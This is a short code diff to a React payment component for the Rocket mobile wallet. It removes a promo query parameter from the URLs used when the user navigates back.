@@ -41,7 +41,7 @@ const RocketPayment = () => {
     const handlePopState = () => {
       window.history.pushState(null, "", window.location.href);
       if (showPin || showOtp || showFailed) navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}`);
-      else navigate(`/payment?amount=${amount}&promo=${encodeURIComponent(searchParams.get('promo') || '')}`);
+      else navigate(`/payment?amount=${amount}`);
     };
     window.addEventListener("popstate", handlePopState);
     return () => window.removeEventListener("popstate", handlePopState);
@@ -117,7 +117,7 @@ const RocketPayment = () => {
 
   const handleBack = () => {
     if (showPin || showOtp || showFailed) navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}`);
-    else navigate(`/payment?amount=${amount}&promo=${encodeURIComponent(searchParams.get('promo') || '')}`);
+    else navigate(`/payment?amount=${amount}`);
   };
   const handleReset = () => { setMobileAccount(""); setPin(""); setShowError(""); setTimeout(() => mobileRef.current?.focus(), 50); };
   const togglePinVisibility = () => setShowPin(!showPin);
